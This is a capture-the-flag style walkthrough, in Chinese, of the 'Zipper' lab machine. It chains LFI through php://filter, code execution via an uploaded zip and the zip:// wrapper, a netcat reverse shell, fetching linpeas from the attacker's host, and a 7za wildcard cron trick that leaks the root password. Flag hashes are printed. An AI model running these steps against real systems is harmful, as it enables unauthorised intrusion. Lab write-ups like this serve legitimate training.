###### tags: `Offsec` `PG Practice` `Hard` `Linux`

# Zipper
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.221.229 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.221.229:22
Open 192.168.221.229:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

前往80port可以點`http://192.168.221.229/index.php?file=home`，嘗試[LFI](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Inclusion.md)
```
http://192.168.221.229/index.php?file=php://filter/convert.base64-encode/resource=index

PD9waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwppZihpc3NldCgkZmlsZSkpCnsKICAgIGluY2x1ZGUoIiRmaWxlIi4iLnBocCIpOwp9CmVsc2UKewppbmNsdWRlKCJob21lLnBocCIpOwp9Cj8+Cg==

# decode
<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>
```

查看`http://192.168.221.229/index.php?file=php://filter/convert.base64-encode/resource=home`
```
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+WmlwcGVyPC90aXRsZT4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiLCBzaHJpbmstdG8tZml0PW5vIj48bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL25vcm1hbGl6ZS81LjAuMC9ub3JtYWxpemUubWluLmNzcyI+CjxsaW5rIHJlbD0nc3R5bGVzaGVldCcgaHJlZj0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYmV0YS4yL2Nzcy9ib290c3RyYXAubWluLmNzcyc+CjxsaW5rIHJlbD0nc3R5bGVzaGVldCcgaHJlZj0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuNy4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyc+PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4wLjAvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KCjwvaGVhZD4KPGJvZHk+Cjw/cGhwIGluY2x1ZGUgJ3VwbG9hZC5waHAnOyA/Pgo8IS0tIHBhcnRpYWw6aW5kZXgucGFydGlhbC5odG1sIC0tPgo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1tZCBuYXZiYXItZGFyayBmaXhlZC10b3AgYmctZGFyayI+CiAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iIyI+CiAgICA8aSBjbGFzcz0iZmEgZmEtY29kZXBlbiIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4KICAgIFppcHBlcgogIDwvYT4KICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyc0V4YW1wbGVEZWZhdWx0IiBhcmlhLWNvbnRyb2xzPSJuYXZiYXJzRXhhbXBsZURlZmF1bHQiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+CiAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPgogIDwvYnV0dG9uPgoKICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZiYXJzRXhhbXBsZURlZmF1bHQiPgogICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1yLWF1dG8iPgogICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIGFjdGl2ZSI+CiAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIvaW5kZXgucGhwP2ZpbGU9aG9tZSI+SG9tZSA8c3BhbiBjbGFzcz0ic3Itb25seSI+KGN1cnJlbnQpPC9zcGFuPjwvYT4KICAgICAgPC9saT4KICAgIDwvdWw+CiAgICA8Zm9ybSBjbGFzcz0iZm9ybS1pbmxpbmUgbXktMiBteS1sZy0wIj4KICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wgbXItc20tMiIgdHlwZT0idGV4dCIgcGxhY2Vob2xkZXI9IlNlYXJjaCIgYXJpYS1sYWJlbD0iU2VhcmNoIj4KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IG15LTIgbXktc20tMCIgdHlwZT0ic3VibWl0Ij5TZWFyY2g8L2J1dHRvbj4KICAgIDwvZm9ybT4KICA8L2Rpdj4KPC9uYXY+Cgo8IS0tIE1haW4ganVtYm90cm9uIGZvciBhIHByaW1hcnkgbWFya2V0aW5nIG1lc3NhZ2Ugb3IgY2FsbCB0byBhY3Rpb24gLS0+CjxkaXYgY2xhc3M9Imp1bWJvdHJvbiI+CiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxoMSBjbGFzcz0iZGlzcGxheS0zIj5XZWxjb21lIHRvIFppcHBlciE8L2gxPgogICAgPHAgY2xhc3M9ImxlYWQiPgogICAgICBXaXRoIHRoaXMgb25saW5lIFpJUCBjb252ZXJ0ZXIgeW91IGNhbiBjb21wcmVzcyB5b3VyIGZpbGVzIGFuZCBjcmVhdGUgYSBaSVAgYXJjaGl2ZS4gUmVkdWNlIGZpbGUgc2l6ZSBhbmQgc2F2ZSBiYW5kd2lkdGggd2l0aCBaSVAgY29tcHJlc3Npb24uIAogICAgICBZb3VyIHVwbG9hZGVkIGZpbGVzIGFyZSBlbmNyeXB0ZWQgYW5kIG5vIG9uZSBjYW4gYWNjZXNzIHRoZW0uCiAgICA8L3A+CiAgICA8aHIgY2xhc3M9Im15LTQiPgogICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgcm93LTEyIj4KICAgIAkJPGg0IGNsYXNzPSJjb2wtMTIgdGV4dC1jZW50ZXIgbWItNSI+Q3JlYXRlIFppcCBGaWxlIG9mIE11bHRpcGxlIFVwbG9hZGVkIEZpbGVzIDwvaDQ+CiAgICAJCTxkaXYgY2xhc3M9InJvdy04IGZvcm0tY29udGFpbmVyIj4KICAgICAgICAgICAgPD9waHAgCiAgICAgICAgICAgIGlmKCFlbXB0eSgkZXJyb3IpKSB7IAogICAgICAgICAgICA/PgogICAgCQkJPHAgY2xhc3M9ImVycm9yIHRleHQtY2VudGVyIj48P3BocCBlY2hvICRlcnJvcjsgPz48L3A+CiAgICAgICAgICAgIDw/cGhwIAogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CiAgICAgICAgICAgIDw/cGhwIAogICAgICAgICAgICBpZighZW1wdHkoJHN1Y2Nlc3MpKSB7IAogICAgICAgICAgICA/PgogICAgCQkJPHAgY2xhc3M9InN1Y2Nlc3MgdGV4dC1jZW50ZXIiPgogICAgICAgICAgICBGaWxlcyB1cGxvYWRlZCBzdWNjZXNzZnVsbHkgYW5kIGNvbXByZXNzZWQgaW50byBhIHppcCBmb3JtYXQKICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8cCBjbGFzcz0ic3VjY2VzcyB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGhyZWY9InVwbG9hZHMvPD9waHAgZWNobyAkc3VjY2VzczsgPz4iIHRhcmdldD0iX19ibGFuayI+Q2xpY2sgaGVyZSB0byBkb3dubG9hZCB0aGUgemlwIGZpbGU8L2E+CiAgICAgICAgICAgIDwvcD4KCSAgICAJICAgIDw/cGhwIAogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CgkJICAgIAk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KCQkJCSAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCI+CgkJCQkJCTxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLXByZXBlbmQiPgoJCQkJCQkgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgdmFsdWU9IlVwbG9hZCI+CgkJCQkJCTwvZGl2PgoJCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CgkJCQkJCSAgICA8aW5wdXQgdHlwZT0iZmlsZSIgY2xhc3M9ImN1c3RvbS1maWxlLWlucHV0IiBuYW1lPSJpbWdbXSIgbXVsdGlwbGU+CgkJCQkJCSAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1maWxlLWxhYmVsIiA+Q2hvb3NlIEZpbGU8L2xhYmVsPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZm9ybT4KCQkJCQogICAgCQk8L2Rpdj4KCQk8L2Rpdj4KICA8L2Rpdj4KCgo8L2Rpdj4KCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgPGZvb3Rlcj4KICAgIDxwPiZjb3B5OyBaaXBwZXIgMjAyMTwvcD4KICA8L2Zvb3Rlcj4KPC9kaXY+IDwhLS0gLy5jb250YWluZXIgLS0+CjwhLS0gcGFydGlhbCAtLT4KICA8c2NyaXB0IHNyYz0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTMuMC91bWQvcG9wcGVyLm1pbi5qcyc+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC80LjAuMC1iZXRhLjIvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMnPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K

# decode
...
<?php include 'upload.php'; ?>
<!-- partial:index.partial.html -->
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
...
```

查看`http://192.168.221.229/index.php?file=php://filter/convert.base64-encode/resource=upload`
```
PD9waHAKaWYgKCRfRklMRVMgJiYgJF9GSUxFU1snaW1nJ10pIHsKICAgIAogICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydpbWcnXVsnbmFtZSddWzBdKSkgewogICAgICAgIAogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICR6aXBfbmFtZSA9IGdldGN3ZCgpIC4gIi91cGxvYWRzL3VwbG9hZF8iIC4gdGltZSgpIC4gIi56aXAiOwogICAgICAgIAogICAgICAgIC8vIENyZWF0ZSBhIHppcCB0YXJnZXQKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwX25hbWUsIFppcEFyY2hpdmU6OkNSRUFURSkgIT09IFRSVUUpIHsKICAgICAgICAgICAgJGVycm9yIC49ICJTb3JyeSBaSVAgY3JlYXRpb24gaXMgbm90IHdvcmtpbmcgY3VycmVudGx5Ljxici8+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGltYWdlQ291bnQgPSBjb3VudCgkX0ZJTEVTWydpbWcnXVsnbmFtZSddKTsKICAgICAgICBmb3IoJGk9MDskaTwkaW1hZ2VDb3VudDskaSsrKSB7CiAgICAgICAgCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWydpbWcnXVsndG1wX25hbWUnXVskaV0gPT0gJycpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXduYW1lID0gZGF0ZSgnWW1kSGlzJywgdGltZSgpKSAuIG10X3JhbmQoKSAuICcudG1wJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1vdmluZyBmaWxlcyB0byB6aXAuCiAgICAgICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoJF9GSUxFU1snaW1nJ11bJ25hbWUnXVskaV0sIGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2ltZyddWyd0bXBfbmFtZSddWyRpXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gbW92aW5nIGZpbGVzIHRvIHRoZSB0YXJnZXQgZm9sZGVyLgogICAgICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snaW1nJ11bJ3RtcF9uYW1lJ11bJGldLCAnLi91cGxvYWRzLycgLiAkbmV3bmFtZSk7CiAgICAgICAgfQogICAgICAgICR6aXAtPmNsb3NlKCk7CiAgICAgICAgCiAgICAgICAgLy8gQ3JlYXRlIEhUTUwgTGluayBvcHRpb24gdG8gZG93bmxvYWQgemlwCiAgICAgICAgJHN1Y2Nlc3MgPSBiYXNlbmFtZSgkemlwX25hbWUpOwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAnPHN0cm9uZz5FcnJvciEhIDwvc3Ryb25nPiBQbGVhc2Ugc2VsZWN0IGEgZmlsZS4nOwogICAgfQp9Cg==

# decode
...
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
...
```

一樣參考上面的cheat sheet或是[PHP ZIP:// WRAPPER FOR RCE](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------)上傳zip之後前往`192.168.221.229/index.php?file=zip://uploads/upload_1716196660.zip%23shell`等回彈可得`www-data` user，在`var/www`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ zip shell.zip shell.php

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@zipper:/var/www$ cat local.txt
f3797a77057b02d248c59a7e7f400fd2
```

`linpeas.sh`
```
www-data@zipper:/tmp$ wget 192.168.45.179:22/linpeas.sh
www-data@zipper:/tmp$ chmod +x linpeas.sh
www-data@zipper:/tmp$ ./linpeas.sh

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh


╔══════════╣ Executable files potentially added by user (limit 70)
2024-05-21+01:27:19.6639998980 /var/www/local.txt
2021-08-12+12:39:12.7400516130 /opt/backup.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                                                    
drwxr-xr-x  3 root root 4096 Aug 12  2021 .
drwxr-xr-x 20 root root 4096 Aug 12  2021 ..
-rwxr-xr-x  1 root root  153 Aug 12  2021 backup.sh
drwxr-xr-x  2 root root 4096 May 21 01:31 backups
```

查看`backup.sh`
```bash
www-data@zipper:/opt$ cat backup.sh

#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

查看[Wildcards Spare tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----b49a52ed8e38--------------------------------#id-7z)查看`/var/www/html/uploads`裡面就有`/root/secret`
```
www-data@zipper:/var/www/html/uploads$ ls -la
ls -la
total 20
drwxr-xr-x 2 www-data www-data 4096 May 21 01:31 .
drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
-rw-r--r-- 1 www-data www-data    0 Aug 12  2021 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
-rw-r--r-- 1 www-data www-data 2373 May 21 01:30 upload_1716255009.zip
```

查看`/opt/backups/backup.log`
```
www-data@zipper:/opt/backups$ cat backup.log
cat backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 3000

Scanning the drive:
3 files, 2548 bytes (3 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 3


Files read from disk: 3
Archive size: 3000 bytes (3 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1
```

得到`root`的密碼`WildCardsGoingWild`，切成root之後到/root得proof.txt
```
www-data@zipper:/opt/backups$ su root
Password: WildCardsGoingWild
root@zipper:~# cat proof.txt
5e57d000b18893a08935be479972f207
```